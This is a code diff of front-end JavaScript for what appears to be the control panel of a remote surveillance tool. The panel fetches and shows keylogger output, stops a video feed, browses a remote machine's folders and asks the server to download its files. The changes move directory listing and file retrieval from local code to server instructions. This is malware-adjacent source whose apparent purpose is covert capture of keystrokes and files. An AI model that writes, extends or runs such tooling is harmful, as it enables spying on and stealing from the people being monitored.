@@ -12,7 +12,7 @@ document.getElementById('refresh_file').addEventListener('click', function () {
 
 document.getElementById('back_a_dir').addEventListener('click', function () {//go back a directory button
     console.log('back_a_dir clicked');
-    post(JSON.stringify({action:'go_back_a_dir'}),'/action/post/folders/instruct')//Post go back instruction to server
+    post(JSON.stringify({ action: 'go_back_a_dir' }), '/action/post/folders/instruct')//Post go back instruction to server
 
 });
 document.getElementById("stop_video").addEventListener('click', function () {//stop video feed button
@@ -39,7 +39,7 @@ async function request(what) {//make a request to server
 
             var resput = JSON.parse(this.responseText)//Resplnce is an object form the server
 
-            console.log('Sever responed with: ', resput)
+            //console.log('Sever responed with: ', resput)
             switch (what) {
                 case '/action/get/keylog'://keylog
                     writeoutkeylog(resput)
@@ -47,7 +47,17 @@ async function request(what) {//make a request to server
                 case '/action/get/folders'://files and current dir
                     directoryman.files = resput.files;
                     directoryman.current_dir = resput.current_dir;
-                    directoryman.files.forEach(filee => { directoryman.build_dir(resput.current_dir + '\\' + filee, filee) })
+                    dirbox.innerHTML = ""
+                    if (directoryman.current_dir[directoryman.current_dir.length - 1] == undefined) {
+                        document.getElementById('full_path').innerText = 'root';
+                    } else {
+                        document.getElementById('full_path').innerText = directoryman.current_dir[directoryman.current_dir.length - 1];
+                    }
+
+                    for (let i in resput.files) {
+                        directoryman.build_dir(resput.files[i].path, resput.files[i].name, resput.files[i].type)
+                    }
+                    //resput.files.forEach(filee => { directoryman.build_dir(resput.path, resput.name, resput.type) })
                     break;
             }
             //return this.responseText;
@@ -60,13 +70,19 @@ async function request(what) {//make a request to server
     xhttp.send();
 }
 
-async function post(what,where){//post data to server
+async function post(what, where) {//post data to server
     var xhttp = new XMLHttpRequest();
 
     xhttp.onreadystatechange = function () {
         if (this.readyState == 4 && this.status == 200) {
             var resput = JSON.parse(this.responseText)
-            console.log('Sever responed to post ',where,'with: ', resput)
+            console.log('Sever responed to post ', where, 'with: ', resput)
+            if (where == "/action/post/folders/instruct") {//posted an instruction
+                setTimeout(() => { request('/action/get/folders'); }, update_interval);
+                setTimeout(() => { request('/action/get/folders'); }, update_interval * 2);
+                setTimeout(() => { request('/action/get/folders'); }, update_interval * 3);
+                setTimeout(() => { request('/action/get/folders'); }, update_interval * 4);
+            }
         }
     };
 
@@ -75,7 +91,7 @@ async function post(what,where){//post data to server
 }
 
 function writeoutkeylog(keys) {//write keylog data to page
-    console.log('write keylog: ', keys)
+    //console.log('write keylog: ', keys)
     keybox.innerText = "";
 
     keys.forEach(keycode => {
@@ -89,49 +105,26 @@ function writeoutkeylog(keys) {//write keylog data to page
 let directoryman = {
     files: [],
     current_dir: [],
-    search_root: async function () {//Search root drives, functionality stats here
-        console.log('Search root');
-        let letters = ['A:\\', 'B:\\', 'C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\', 'K:\\', 'L:\\', 'M:\\', 'N:\\', 'O:\\', 'P:\\', 'Q:\\', 'R:\\', 'S:\\', 'T:\\', 'U:\\', 'V:\\', 'W:\\', 'X:\\', 'Y:\\', 'Z:\\'];
-        document.getElementById('full_path').innerText = 'Drives';
-        dirbox.innerHTML = "";
-        directoryman.files = [];
-        for (let i in letters) {
-            if (fs.existsSync(letters[i])) {
-                this.build_dir(letters[i], letters[i])
-            }
-        }
-    },
-    search_dir: async function (searchpath) {//searchpath must be a string
-        this.current_dir.push(searchpath);//up the chain
-        console.log('Search: ', searchpath);
-        document.getElementById('full_path').innerText = searchpath;
-        fs.readdir(searchpath, function (err, files) {
-            if (err) {
-                console.log(err)
-                return 0;
-            }
-            dirbox.innerHTML = "";
-            directoryman.files = files;
-            console.log(files)
-            files.forEach(filee => { directoryman.build_dir(searchpath + '\\' + filee, filee) })
 
-        })
-    },
-    build_dir: function (fpath, name) {//represent a directory
+    build_dir: function (fpath, name, type) {//represent a directory
         var directory = document.createElement('div');
         directory.className = "directory"
         var filename = document.createElement('div');
         filename.className = "filename"
         filename.innerText = name;
         var dir_icon = document.createElement('div');
-        if (path.parse(fpath).ext == "") {//directory
+        if (type == "folder") {//directory
             dir_icon.className = "dir_icon"
-            directory.addEventListener('click', function () { directoryman.search_dir(fpath) })//search this directory
+            directory.addEventListener('click', function () {
+                post(JSON.stringify({ action: 'search_dir', path: fpath }), '/action/post/folders/instruct')/*Post go back instruction to server*/
+            })//search this directory
             directory.title = "search directory"
         } else {//file
             dir_icon.className = "file_icon"
             directory.title = "download file"
-            directory.addEventListener('click', function () { })//download file
+            directory.addEventListener('click', function () { //download file
+                post(JSON.stringify({ action: 'download', path: fpath }), '/action/post/folders/instruct')/*Post go back instruction to server*/
+            })
         }
 
         directory.appendChild(filename)
@@ -140,23 +133,4 @@ let directoryman = {
 
 
     },
-    go_back_a_dir: function () {
-        console.log('Go back a dir')
-        if (directoryman.current_dir.length < 2) {
-            directoryman.current_dir = [];
-            directoryman.search_root();
-            return 0;
-        } else {
-            directoryman.current_dir.pop();
-            var current = directoryman.current_dir.pop();
-            console.log('back to: ', current)
-            //document.getElementById('full_path').innerText = directoryman.current_dir[directoryman.current_dir.length]
-            if (current == undefined) {
-                directoryman.current_dir = [];
-                directoryman.search_root();
-            } else {
-                directoryman.search_dir(current)
-            }
-        }
-    }
 }
